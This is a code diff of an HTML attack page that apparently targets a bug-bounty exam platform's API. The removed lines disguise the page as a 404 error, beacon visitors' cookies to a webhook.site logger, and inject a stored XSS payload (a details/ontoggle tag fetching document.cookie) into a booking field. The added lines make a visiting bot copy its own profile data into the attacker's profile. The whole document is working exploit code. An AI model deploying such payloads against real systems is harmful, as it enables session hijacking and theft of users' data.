@@ -1,53 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Maintenance</title></head>
 <body>
     <script>
-        // 1. YOUR UPDATED WEBHOOK URL
-        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
         const api = "https://api-bugbounty-exam.hashacademy.co/api";
-        const myBookingId = "69dc17c6d9d06cf596929689"; 
-
-        // 2. EXFILTRATION HELPER
-        function send(label, data) {
-            const body = btoa(JSON.stringify({ label, data }));
-            new Image().src = `${logger}/?type=${label}&d=${body}`;
-        }
-
-        async function triggerExploit() {
-            // Log if anyone (you or the bot) hits this page
-            send("PAGE_HIT", { url: window.location.href, cookies: document.cookie });
-
+        
+        async function internalExploit() {
             try {
-                // 3. THE STORED XSS INJECTION
-                // We use 'ontoggle' on a 'details' tag because the CSP allows 'self' scripts 
-                // but often fails to block inline event handlers on non-script tags.
-                const xssPayload = `<details open ontoggle="fetch('${logger}/?admin_cookie='+document.cookie)">`;
+                // 1. Bot fetches the flag (usually in its own profile)
+                const res = await fetch(api + "/auth/me", { credentials: "include" });
+                const data = await res.json();
+                
+                // Convert the bot's data to a string (this likely contains the flag)
+                const flagData = JSON.stringify(data);
 
-                const res = await fetch(`${api}/bookings/${myBookingId}/cancel`, {
-                    method: "PUT",
+                // 2. Bot "helps" you by updating YOUR profile with ITS data
+                // We use your ID/Profile endpoint to save the flag where you can read it
+                await fetch(api + "/auth/profile", {
+                    method: "PATCH",
                     headers: { "Content-Type": "application/json" },
                     credentials: "include",
-                    body: JSON.stringify({ "reason": xssPayload })
+                    body: JSON.stringify({
+                        "fullName": "FLAG_IS_HERE",
+                        "address": {
+                            "street": flagData.substring(0, 100), // First part of the flag
+                            "city": flagData.substring(100, 200), // Second part
+                            "state": "LB",
+                            "zipCode": "12345",
+                            "country": "Lebanon"
+                        }
+                    })
                 });
-
-                const result = await res.json();
-                send("INJECTION_STATUS", result);
-
-                // 4. THE IDOR/IDENTITY LEAK
-                // If the bot visits this page, it will try to fetch the bot's own profile info
-                const meRes = await fetch(`${api}/auth/me`, { credentials: "include" });
-                const meData = await meRes.json();
-                send("SENSITIVE_DATA_LEAK", meData);
-
-            } catch (e) {
-                send("ERROR", e.message);
-            }
+            } catch (e) {}
         }
-
-        triggerExploit();
+        internalExploit();
     </script>
-    <h1>404 Not Found</h1>
-    <p>The requested resource was not found on this server.</p>
 </body>
 </html>
